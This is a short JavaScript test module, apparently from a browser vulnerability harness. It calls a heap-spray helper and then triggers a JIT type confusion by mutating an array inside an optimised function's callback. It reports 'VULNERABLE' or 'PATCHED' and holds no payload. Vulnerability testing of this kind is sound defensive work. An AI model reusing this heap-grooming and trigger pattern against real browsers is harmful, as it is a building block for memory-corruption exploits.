// Shared heap spray
import { sprayHeap } from '/lib/spray.js';

export const testName = "JIT Type Confusion";

export function runTest() {
    sprayHeap(); // Groom memory

    let arr = [1.1, 2.2, 3.3];
    function confuse(x, callback) {
        let v = x[0];
        callback();
        return v + x[1];
    }

    // JIT optimization
    for (let i = 0; i < 1e5; i++) confuse(arr, () => {});

    // Trigger
    let evil = () => { arr[0] = {}; };
    let res = confuse(arr, evil);

    return isNaN(res) ? "VULNERABLE" : "PATCHED";
}
